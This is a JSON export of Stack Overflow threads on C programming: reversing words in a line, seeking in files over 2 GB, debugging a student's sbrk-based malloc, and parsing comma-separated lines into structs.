"is_accepted": false, "score": 0, "last_activity_date": 1542143485, "creation_date": 1542143485, "answer_id": 53289544, "question_id": 53289198, "link": "https://stackoverflow.com/questions/53289198/reversing-the-order-of-words-backwards-in-a-string/53289544#53289544", "title": "Reversing the order of words backwards in a string", "body": "<p>Replace  <code>input[length - 1] = space;</code> with  <code>input[length] = space;</code></p>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 10516686, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70a4245b6b52b26f978492e52c7a47c4?s=128&d=identicon&r=PG&f=1", "display_name": "Nangs", "link": "https://stackoverflow.com/users/10516686/nangs"}, "edited": false, "score": 0, "creation_date": 1542146636, "post_id": 53289838, "comment_id": 93462114, "body": "Thank you for your detailed answer. One thing that I want to add is that I wanted to use command line parameters for passing my files to the program, would that make any difference in a situation like this ?"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 31, "user_id": 10516686, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70a4245b6b52b26f978492e52c7a47c4?s=128&d=identicon&r=PG&f=1", "display_name": "Nangs", "link": "https://stackoverflow.com/users/10516686/nangs"}, "edited": false, "score": 1, "creation_date": 1542148885, "post_id": 53289838, "comment_id": 93462926, "body": "@Nangs: how you get the filenames and/or the input or output streams is a separate issue from how you deal with a single line of text."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 4, "last_activity_date": 1542145500, "last_edit_date": 1542145500, "creation_date": 1542144848, "answer_id": 53289838, "question_id": 53289198, "link": "https://stackoverflow.com/questions/53289198/reversing-the-order-of-words-backwards-in-a-string/53289838#53289838", "title": "Reversing the order of words backwards in a string", "body": "<p>The flaws come from your approach:</p>\n\n<ul>\n<li>why do you force a space at offset <code>length - 1</code>? If you read the line with <code>fgets()</code>, there is probably a newline (<code>'\\n'</code>) at the end of the line, but it might be missing at the end of the input, which would explain the <code>x</code> getting overwritten on the last line.</li>\n<li>you should not modify the input buffer.</li>\n</ul>\n\n<p>Here is a simplified version, along with a simple <code>main</code> function:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid reverse(const char *input, int length, char *output) {\n    int i, j, k, v;\n    for (i = k = v = 0;; i++) {\n        if (i == length || input[i] == ' ') {\n            for (j = i; j-- &gt; k; v++) {\n                output[v] = input[j];\n            }\n            for (; i &lt; length &amp;&amp; input[i] == ' '; i++) {\n                output[v++] = ' ';\n            }\n            if (i == length) {\n                output[v] = '\\0';\n                break;\n            }\n            k = i;\n        }\n    }\n    for (i = 0, j = length - 1; i &lt; j; i++, j--) {\n        char c = output[i];\n        output[i] = output[j];\n        output[j] = c;\n    }\n}\n\nint main() {\n    char input[256];\n    char output[256];\n\n    while (fgets(input, sizeof input, stdin)) {\n        reverse(input, strcspn(input, \"\\n\"), output);\n        puts(output);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>three two one\nsix five four\n</code></pre>\n\n<p>Here is a simpler reverse function that operates in one pass:</p>\n\n<pre><code>#include &lt;string.h&gt;\n\nvoid reverse(const char *input, int length, char *output) {\n    int i, j, k, v;\n    for (i = k = 0, v = length;; i++) {\n        if (i == length || input[i] == ' ') {\n            for (j = i; j-- &gt; k;) {\n                output[--v] = input[j];\n            for (; i &lt; length &amp;&amp; input[i] == ' '; i++) {\n                output[--v] = ' ';\n            }\n            if (v == 0) {\n                output[length] = '\\0';\n                break;\n            }\n            k = i;\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 10516686, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70a4245b6b52b26f978492e52c7a47c4?s=128&d=identicon&r=PG&f=1", "display_name": "Nangs", "link": "https://stackoverflow.com/users/10516686/nangs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 88, "favorite_count": 0, "accepted_answer_id": 53289838, "answer_count": 2, "score": 1, "last_activity_date": 1542211540, "creation_date": 1542141785, "last_edit_date": 1542144074, "question_id": 53289198, "link": "https://stackoverflow.com/questions/53289198/reversing-the-order-of-words-backwards-in-a-string", "title": "Reversing the order of words backwards in a string", "body": "<p>Sorry for such a mediocre question, but I ran into what seems to be a tiny problem, but simply can't get over it. For my task I have to take a line of string from a file, and put it into another file backwards, for example:</p>\n\n<pre><code>one two three\nfour five six\n</code></pre>\n\n<p>would be</p>\n\n<pre><code>three two one\nsix five four\n</code></pre>\n\n<p>My problem is, is that I'm getting</p>\n\n<pre><code> three two one\n si five four\n</code></pre>\n\n<p>So basically the flaw is that there is a space character at the beginning of each line and the last letter of the last word is always missing. Here's my reverse function:</p>\n\n<pre><code>void reverse(char input[], int length, char output[]) {\n    char space = 32;\n    input[length - 1] = space;\n    int value = 0;\n    int i, k = 0, j;\n    for (i = 0; i &lt;= length; i++) {\n        if (input[i] == space) {\n            for (j = i - 1; j &gt;= k; j--, value++) {\n                output[value] = input[j];\n            }\n            if (j == -1) {\n                output[value] = space;\n                value++;\n            }\n            k = i;\n        }\n    }\n\n    char c = 0;\n    for (int i = 0, j = length - 1; i &lt;= j; i++, j--) {\n        c = output[i];\n        output[i] = output[j];\n        output[j] = c;\n    }\n}\n</code></pre>\n\n<p>What I'm doing is first reversing each word by character, and then the whole line. If someone could help me find the last bits that I've missed I would greatly appreciate it.</p>\n"}, {"tags": ["c", "file"], "comments": [{"owner": {"reputation": 1519, "user_id": 5447136, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/bpy5K.jpg?s=128&g=1", "display_name": "bool3max", "link": "https://stackoverflow.com/users/5447136/bool3max"}, "edited": false, "score": 1, "creation_date": 1542141050, "post_id": 53288966, "comment_id": 93459963, "body": "Depending on the platform you&#39;re developing for, defining <code>_FILE_OFFSET_BITS</code> to <code>64</code> and using the stdlibrary functions <code>fseeko</code> and <code>ftello</code> may solve your problem."}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1542141059, "post_id": 53288966, "comment_id": 93459965, "body": "What OS? Windows <code>SetFilePointer</code> can do 64 bit seek."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1542141126, "post_id": 53288966, "comment_id": 93459984, "body": "What platform?  Most 64-bit operating systems natively support files larger than 2GB."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542141449, "post_id": 53288966, "comment_id": 93460090, "body": "<code>fseek()</code> is not limited to <code>int</code> size, but to <code>long</code>.  What is <code>LONG_MAX</code> on your system?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user8620802"}, "reply_to_user": {"reputation": 1519, "user_id": 5447136, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/bpy5K.jpg?s=128&g=1", "display_name": "bool3max", "link": "https://stackoverflow.com/users/5447136/bool3max"}, "edited": false, "score": 0, "creation_date": 1542141569, "post_id": 53288966, "comment_id": 93460120, "body": "@bool3max I thought this doesn&#39;t work on a 32-bit computer. If it does work, I&#39;m curious how considering the return value is a 4-byte long int (off_t) if I&#39;m not mistaken."}, {"owner": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 3, "creation_date": 1542141852, "post_id": 53288966, "comment_id": 93460226, "body": "You may find your answer there: <a href=\"https://stackoverflow.com/questions/1035657/seeking-and-reading-large-files-in-a-linux-c-application\">Seeking and reading large files in a Linux C++ application</a>"}], "answers": [{"tags": [], "owner": {"reputation": 1519, "user_id": 5447136, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/bpy5K.jpg?s=128&g=1", "display_name": "bool3max", "link": "https://stackoverflow.com/users/5447136/bool3max"}, "is_accepted": false, "score": 1, "last_activity_date": 1542141261, "creation_date": 1542141261, "answer_id": 53289080, "question_id": 53288966, "link": "https://stackoverflow.com/questions/53288966/seeking-a-file-position-232-in-c/53289080#53289080", "title": "Seeking a File Position &gt; 2^32 in C", "body": "<p>In the case of a standard linux/glibc (can't vouch for others?) environment: </p>\n\n<ul>\n<li><code>#define _FILE_OFFSET_BITS 64</code> -- turns <code>off_t</code> to a 64bit type</li>\n<li>use stdlib functions <code>fseeko()</code> and <code>ftello()</code> from <em>stdio.h</em> instead of their regular counterparts</li>\n</ul>\n\n<p>Also see their respective manpages.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8620802"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "closed_date": 1542158239, "answer_count": 1, "score": 1, "last_activity_date": 1542141654, "creation_date": 1542140759, "last_edit_date": 1542141654, "question_id": 53288966, "link": "https://stackoverflow.com/questions/53288966/seeking-a-file-position-232-in-c", "closed_reason": "Duplicate", "title": "Seeking a File Position &gt; 2^32 in C", "body": "<p>I'm writing a program to write a lot of data to a file, but the file will eventually be large enough that I couldn't seek through it because the position would be greater than the maximum integer size on a <strong>32-bit</strong> computer. I would like to seek to a location at least 2^35. What is the proper way to do this?</p>\n\n<p>Edit:\nI am trying to make a cross-platform program, but I am currently working on a Linux 32-bit OS.</p>\n"}, {"tags": ["c", "pointers", "segmentation-fault", "return"], "comments": [{"owner": {"reputation": 467, "user_id": 9950378, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-bMztUomG68Y/AAAAAAAAAAI/AAAAAAAAABE/FcXN1FGD0cQ/photo.jpg?sz=128", "display_name": "Jean-Marc Zimmer", "link": "https://stackoverflow.com/users/9950378/jean-marc-zimmer"}, "edited": false, "score": 0, "creation_date": 1542192142, "post_id": 53288938, "comment_id": 93477357, "body": "You have two <code>FREE(this);</code> in your program. I bet this comes from the value of <code>this</code> being incorrectly reinitialized."}], "owner": {"reputation": 21, "user_id": 10543018, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-5hix5aAbPjM/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DXtMNMvYm1po3R0zZQ36iG_m6ibFA/mo/photo.jpg?sz=128", "display_name": "Joe Ducko", "link": "https://stackoverflow.com/users/10543018/joe-ducko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1542141635, "creation_date": 1542140639, "last_edit_date": 1542141635, "question_id": 53288938, "link": "https://stackoverflow.com/questions/53288938/wrong-pointer-returned-when-creating-a-version-of-malloc-in-c", "title": "Wrong pointer returned when creating a version of malloc in c", "body": "<p>What is the reason for this error? I am creating a personal version of malloc and free for my C class and but encountering the following issue: I split a free spot into 2 nodes using the best fit method to insert a value into my linked list, however it's returning the incorrect value to the testing program. The value of currentBlock + sizeof(struct Block) is 6299672 but when I print it out from the testing program it prints 6300251. This leads to a seg fault due to the pointer being incorrect when I free it later in the program. Is this an issue from incorrect casting or am I missing something else?</p>\n\n<p>Thank you! The relevant sections of my code are below:</p>\n\n<p>Below is my my_malloc and my_free methods:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;assert.h&gt;\n\nstruct Block {\n  int occ;              // whether block is occupied\n  int size;             // size of block (including header)\n  struct Block *prev;   // pointer to previous block\n  struct Block *next;   // pointer to next block\n};\n\nstatic struct Block *head = NULL;       // head of list\n\nvoid *my_malloc(int size)\n{\n\n  struct Block *currentBlock = head;\n  struct Block *bestFitBlock = NULL;\n  int bestFit = 0;\n\n  void *offset = sbrk(0);\n  void *ending = offset + size + sizeof(struct Block);\n  int success = brk(ending);\n\n  struct Block *newBlock = offset;\n  newBlock -&gt; occ = 1;\n  newBlock -&gt; size = size + sizeof(struct Block);\n\n  while(head != NULL &amp;&amp; currentBlock != NULL){\n    //If the block you're currently looking at is free and either the same or larger size than the incoming block,\n    //then split the block and take up the block and have a free block\n    if(currentBlock -&gt; occ == 0){\n      if(currentBlock -&gt; size  &gt;= newBlock -&gt; size){\n        //If the incoming block and the free block are the same size, just fill it in\n        if(currentBlock -&gt; size == newBlock -&gt; size){\n          currentBlock -&gt; occ = 1;\n          int removeExtra = 0 - newBlock -&gt; size;\n          sbrk(removeExtra);\n          return currentBlock + sizeof(struct Block);\n        }\n        //If they're bigger sizes, split it into 2 blocks and fill 1 in. Must also leave room for another block to the right\n        else if(currentBlock -&gt; size &gt;= newBlock -&gt; size + sizeof(struct Block)){\n          //Set the integer to 1 to denote that there is a place for it to go if no blocks match size\n          bestFit = 1;\n          //Save the block in which it would fit best if no blocks match size\n          if(bestFitBlock == NULL){\n            bestFitBlock = currentBlock;\n          }\n          else if(currentBlock -&gt; size &gt; bestFitBlock -&gt; size){\n            bestFitBlock = currentBlock;\n          }\n        }\n      }\n    }\n    //Go to the next block\n    currentBlock = currentBlock -&gt; next;\n  }\n\n  //Split the block into a taken and free slot\n  if(bestFit == 1){\n    currentBlock = bestFitBlock;\n    int freeSize = currentBlock -&gt; size - newBlock -&gt; size;\n\n    currentBlock -&gt; occ = 1;\n    currentBlock -&gt; size = newBlock -&gt; size;\n\n    void *tempPointer = (int)currentBlock + (int)currentBlock -&gt; size;\n    struct Block *newFreeBlock = tempPointer;\n    newFreeBlock -&gt; occ = 0;\n    newFreeBlock -&gt; size = freeSize;\n    newFreeBlock -&gt; next = currentBlock -&gt; next;\n    newFreeBlock -&gt; prev = currentBlock;\n    newFreeBlock -&gt; next -&gt; prev = newFreeBlock;\n\n    currentBlock -&gt; next = newFreeBlock;\n\n    //TROUBLESHOOTING: PRINT WHAT IS SUPPOSED TO BE RETURNED\n    printf(\"%d \", (int)currentBlock + (int)sizeof(struct Block));\n\n    int removeExtra = 0 - newBlock -&gt; size;\n    sbrk(removeExtra);\n    return (int)currentBlock + (int)sizeof(struct Block);\n  }\n\n  if(head == NULL){\n    head = newBlock;\n  }\n  else{\n    currentBlock = head;\n    while(currentBlock -&gt; next != NULL){\n      currentBlock = currentBlock -&gt; next;\n    }\n    currentBlock -&gt; next = newBlock;\n    newBlock -&gt; prev = currentBlock;\n  }\n\n  if(success == 0){\n    return offset + sizeof(struct Block);\n  }\n  else{\n    printf(\"Error - Malloc not completed\\n\");\n    return (int *)-1;\n  }\n}\n\n\nvoid my_free(void *data)\n{\n  struct Block *currentBlock = head;\n  void *lookingFor = data - sizeof(struct Block);\n  while(lookingFor != currentBlock){\n    currentBlock = currentBlock -&gt; next;\n  }\n  currentBlock -&gt; occ = 0;\n\n\n  //If the block after the one being freed is empty, coalesce these two together\n  if(currentBlock -&gt; next != NULL &amp;&amp; currentBlock -&gt; next -&gt; occ == 0){\n    currentBlock -&gt; size = currentBlock -&gt; size + currentBlock -&gt; next -&gt; size;\n    currentBlock -&gt; next = currentBlock -&gt; next -&gt; next;\n    if(currentBlock -&gt; next != NULL){\n      struct Block *tempBlock = currentBlock -&gt; next;\n      tempBlock -&gt; prev = currentBlock;\n    }\n  }\n\n  //If the block before the one being freed is empty, change the current block to the previous one\n  //and do the same procedure as above to coalesce the two together\n  if(currentBlock != head &amp;&amp; currentBlock -&gt; prev -&gt; occ == 0){\n    currentBlock = currentBlock -&gt; prev;\n    currentBlock -&gt; size = currentBlock -&gt; size + currentBlock -&gt; next -&gt; size;\n    currentBlock -&gt; next = currentBlock -&gt; next -&gt; next;\n    if(currentBlock -&gt; next != NULL){\n      currentBlock -&gt; next -&gt; prev = currentBlock;\n    }\n  }\n\n  //If the free block is next to the end of the heap, decrease the size of the heap\n  //by disbanding the last block\n  if(currentBlock -&gt; next == NULL){\n    int sizeDecrease = 0 - currentBlock -&gt; size;\n    sbrk(sizeDecrease);\n    if(currentBlock == head){\n      brk(head);\n      head = NULL;\n    }\n    else{\n      currentBlock -&gt; prev -&gt; next == NULL;\n    }\n  }\n}\n</code></pre>\n\n<p>and my testing program:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;assert.h&gt;\n\nvoid *my_malloc(int size);\nvoid my_free(void *data);\n\n//include your code\n\n\n//replace malloc here with the appropriate version of my_malloc\n#define MALLOC my_malloc\n//replace free here with the appropriate version of my_free\n#define FREE my_free\n//define DUMP_HEAP() to be dump_heap() when you are done\n#define DUMP_HEAP()\n\nint main()\n{\n  char *dummy = MALLOC(23 + 24 * 5);\n  FREE(dummy);\n  DUMP_HEAP();\n\n  char *this = MALLOC(5);\n  char *is = MALLOC(3);\n  char *a = MALLOC(2);\n  char *test = MALLOC(5);\n  char *program = MALLOC(8);\n  DUMP_HEAP();\n\n  strcpy(this, \"this\");\n  strcpy(is, \"is\");\n  strcpy(a, \"a\");\n  strcpy(test, \"test\");\n  strcpy(program, \"program\");\n  printf(\"%s %s %s %s %s\\n\", this, is, a, test, program);\n  DUMP_HEAP();\n\n  FREE(is);\n  FREE(test);\n  printf(\"%s %s %s %s %s\\n\", this, \"*\", a, \"*\", program);\n  DUMP_HEAP();\n\n  FREE(this);\n  printf(\"%s %s %s %s %s\\n\", \"*\", \"*\", a, \"*\", program);\n  DUMP_HEAP();\n\n  this = MALLOC(5);\n//TROUBLESHOOTING: PRINT WHAT'S ACTUALLY BEING RETURNED\nprintf(\"%d \", (char *)this);\n  strcpy(this, \"this\");\n  printf(\"%s %s %s %s %s\\n\", this, \"*\", a, \"*\", program);\n  DUMP_HEAP();\n\n  is = MALLOC(3);\n  test = MALLOC(5);\n//MORE TROUBLESHOOTING\nprintf(\"%d \", (char *)test);\n  strcpy(is, \"is\");\n  strcpy(test, \"test\");\n  printf(\"%s %s %s %s %s\\n\", this, is, a, test, program);\n  DUMP_HEAP();\n\n  FREE(test);\n  FREE(is);\n  FREE(a);\n  FREE(this);\n  FREE(program);\n  printf(\"%s %s %s %s %s\\n\", \"*\", \"*\", \"*\", \"*\", \"*\");\n  DUMP_HEAP();\n\n  return 0;\n}\n</code></pre>\n\n<p>The issue I'm having here is a seg fault when the line FREE(this) runs at the end of the program. I assume this is because of the wrong pointer being returned from my my_malloc function. I apologize for the code not being super concise, thanks in advance for any help though!</p>\n"}, {"tags": ["c", "pointers", "struct"], "comments": [{"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 1, "creation_date": 1542138035, "post_id": 53288290, "comment_id": 93458728, "body": "<code>School **Sch</code> so <code>Sch[i]</code> is a pointer - <code>Sch[i].name</code> should produce a compiler error. Show how you call the function."}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 4, "creation_date": 1542138188, "post_id": 53288290, "comment_id": 93458787, "body": "Also, c-strings need to be terminated with <code>\\0</code> which you neglect to do."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1542138229, "post_id": 53288290, "comment_id": 93458810, "body": "Try and give your variables meaningful names, <i>especially</i> as arguments. What is <code>k</code>?"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 2, "creation_date": 1542138246, "post_id": 53288290, "comment_id": 93458814, "body": "Hint: <code>strdup</code> instead of manually copying strings."}, {"owner": {"reputation": 1153, "user_id": 6364386, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cAsvS.jpg?s=128&g=1", "display_name": "Aravind Voggu", "link": "https://stackoverflow.com/users/6364386/aravind-voggu"}, "edited": false, "score": 0, "creation_date": 1542170233, "post_id": 53288290, "comment_id": 93467676, "body": "yap. try better names, and use a better indentation and formatting. Probably install a linter, it checks for formatting &amp; compilation errors as you type.  Also, there are some nice naming conventions out there. for example, instead of <code>k</code>, I would write <code>a_number_of_lines</code>. The<code>a_</code> tells me that the variable is a function argument, and the remaining part tells me what the variable has.  Also, unless you need, declare the variables in the loop. <code>for(int i = 0; i &lt; a_numer_of_lines; i++)</code>"}, {"owner": {"reputation": 35613, "user_id": 7582247, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-OH0qZNY40Y4/AAAAAAAAAAI/AAAAAAAABbc/xAoU3i299E0/photo.jpg?sz=128", "display_name": "Ted Lyngmo", "link": "https://stackoverflow.com/users/7582247/ted-lyngmo"}, "edited": false, "score": 0, "creation_date": 1558778494, "post_id": 53288290, "comment_id": 99218506, "body": "@codingstruggles This question is still listed as unanswered. Doesn&#39;t any of the supplied answers answer it?"}], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 10648154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/025d51487d35ccf5de3ee4be0e30c9bd?s=128&d=identicon&r=PG&f=1", "display_name": "codingstruggles", "link": "https://stackoverflow.com/users/10648154/codingstruggles"}, "edited": false, "score": 0, "creation_date": 1542143589, "post_id": 53288583, "comment_id": 93460881, "body": "Sadly I have to use the format of the struct above. if I used strtok to get each string is there a way to store them in the struct formatted as shown above?"}, {"owner": {"reputation": 1153, "user_id": 6364386, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cAsvS.jpg?s=128&g=1", "display_name": "Aravind Voggu", "link": "https://stackoverflow.com/users/6364386/aravind-voggu"}, "reply_to_user": {"reputation": 39, "user_id": 10648154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/025d51487d35ccf5de3ee4be0e30c9bd?s=128&d=identicon&r=PG&f=1", "display_name": "codingstruggles", "link": "https://stackoverflow.com/users/10648154/codingstruggles"}, "edited": false, "score": 1, "creation_date": 1542169874, "post_id": 53288583, "comment_id": 93467609, "body": "There are, but I advise you go with the answer by Ted Lyngmo. It&#39;s much easier to understand and implement. You can use just the fscanf part, you don&#39;t need to use the other part, but it&#39;s generally good."}], "tags": [], "owner": {"reputation": 1153, "user_id": 6364386, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cAsvS.jpg?s=128&g=1", "display_name": "Aravind Voggu", "link": "https://stackoverflow.com/users/6364386/aravind-voggu"}, "is_accepted": false, "score": 1, "last_activity_date": 1542139085, "creation_date": 1542139085, "answer_id": 53288583, "question_id": 53288290, "link": "https://stackoverflow.com/questions/53288290/how-to-store-dynamic-string-in-a-struct-containing-char-pointer/53288583#53288583", "title": "How to Store dynamic string in a struct ** containing char * pointer", "body": "<p>Your file is very similar in shape to a csv. See if you can use any csv parsing libraries or <a href=\"https://stackoverflow.com/questions/12911299/read-csv-file-in-c\">code</a>.</p>\n\n<p>Instead of checking every char, read a whole line into a buffer and use strtok. strtok is a function used to split a string by a delimiter. a ',' in your case.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nconst char* getfield(char* line, int num)\n{\n    const char* tok;\n    for (tok = strtok(line, \",\");\n            tok &amp;&amp; *tok;\n            tok = strtok(NULL, \",\\n\"))\n    {\n        if (!--num)\n            return tok;\n    }\n    return NULL;\n}\n\nint main()\n{\n    FILE* stream = fopen(\"in.md\", \"r\");\n\n    char line[1024];\n    while (fgets(line, 1024, stream))\n    {\n        char* tmp1 = strdup(line);\n        char* tmp2 = strdup(line);\n\n        printf(\"Name is %s\\n\", getfield(tmp1, 1));\n        printf(\"State is %s\\n\", getfield(tmp2, 2));\n        // NOTE strtok changes the string. Hence two vars. You can try duplicating in the function instead.\n        // Note that I'm freeing the data. copying with strdup instead of directly assigning may be wise.\n        free(tmp1);\n        free(tmp2);\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1153, "user_id": 6364386, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cAsvS.jpg?s=128&g=1", "display_name": "Aravind Voggu", "link": "https://stackoverflow.com/users/6364386/aravind-voggu"}, "edited": false, "score": 1, "creation_date": 1542170071, "post_id": 53290865, "comment_id": 93467646, "body": "Ah, this is much nice. Thanks showing us! I&#39;m gonna use this better way the next time."}, {"owner": {"reputation": 35613, "user_id": 7582247, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-OH0qZNY40Y4/AAAAAAAAAAI/AAAAAAAABbc/xAoU3i299E0/photo.jpg?sz=128", "display_name": "Ted Lyngmo", "link": "https://stackoverflow.com/users/7582247/ted-lyngmo"}, "reply_to_user": {"reputation": 1153, "user_id": 6364386, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cAsvS.jpg?s=128&g=1", "display_name": "Aravind Voggu", "link": "https://stackoverflow.com/users/6364386/aravind-voggu"}, "edited": false, "score": 0, "creation_date": 1542176266, "post_id": 53290865, "comment_id": 93469362, "body": "Thank you! I very rarely use scanf myself but has its uses :-)"}], "tags": [], "owner": {"reputation": 35613, "user_id": 7582247, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-OH0qZNY40Y4/AAAAAAAAAAI/AAAAAAAABbc/xAoU3i299E0/photo.jpg?sz=128", "display_name": "Ted Lyngmo", "link": "https://stackoverflow.com/users/7582247/ted-lyngmo"}, "is_accepted": false, "score": 1, "last_activity_date": 1542151850, "last_edit_date": 1542151850, "creation_date": 1542150619, "answer_id": 53290865, "question_id": 53288290, "link": "https://stackoverflow.com/questions/53288290/how-to-store-dynamic-string-in-a-struct-containing-char-pointer/53290865#53290865", "title": "How to Store dynamic string in a struct ** containing char * pointer", "body": "<p>You could use something like this to read one School entry from the <code>FILE*</code> you supply:</p>\n\n<pre><code>bool School_read(School* s, FILE* in) {\n\n    int scan = fscanf(in, \" %m[^,\\n], %m[^\\n]\", &amp;s-&gt;name, &amp;s-&gt;state);\n\n    // the fscanf format string:\n    // &lt;space&gt; = skip leading whitespaces (like a newline from the line before)\n    // %m[^,\\n] = read a string until, but not including, \",\" or \"\\n\"  m = allocate space for it\n    // , = expect a comma and discard it\n    // %m[^\\n] = read a string until, but not including, \"\\n\" and allocate space for it\n\n    // just a debug print\n    fprintf(stderr, \" -- got %d hits, &gt;%s&lt; &gt;%s&lt;\\n\", scan, s-&gt;name, s-&gt;state);\n\n    if(scan&lt;2) {\n        // not a complete scan, failure\n        if(scan==1) {\n            // apparently, we got one match, free it\n            free(s-&gt;name);\n            s-&gt;name = NULL;\n        }\n        return false;\n    }\n    return true;\n}\n</code></pre>\n\n<p>I don't know how widespread the support for the 'm' modifier that dynamically allocates memory for the strings is though. Recent gcc and clang compilers supports it anyway.</p>\n\n<p>You could also make functions for creating and destroying a School:</p>\n\n<pre><code>School* School_create() {\n    School* s = malloc(sizeof(School));\n    if(s!=NULL) {\n        s-&gt;name = NULL;\n        s-&gt;state = NULL;\n    }\n    return s;\n}\n\nvoid School_destroy(School** sp) {\n    if(sp) {\n        School* s = *sp;\n        if(s) {\n            if(s-&gt;state) free(s-&gt;state);\n            if(s-&gt;name) free(s-&gt;name);\n            free(s);\n        }\n        *sp = NULL;\n    }\n}\n</code></pre>\n\n<p>..and combine them all:</p>\n\n<pre><code>School* School_create_and_read(FILE* in) {\n    School* s = School_create();\n    if(s) {\n        if(School_read(s, in)==false) {\n            School_destroy(&amp;s);\n        }\n    }\n    return s;\n}\n</code></pre>\n\n<p>So in your function populating the array of schools:</p>\n\n<pre><code>void input_schools(FILE* IN, School** Sch, int k) { \n    School* s;\n    while( (s=School_create_and_read(IN)) ) {\n        // s is a valid School pointer\n        // store it in your array \n    }               \n}\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 10648154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/025d51487d35ccf5de3ee4be0e30c9bd?s=128&d=identicon&r=PG&f=1", "display_name": "codingstruggles", "link": "https://stackoverflow.com/users/10648154/codingstruggles"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 199, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1542151850, "creation_date": 1542137614, "last_edit_date": 1542138584, "question_id": 53288290, "link": 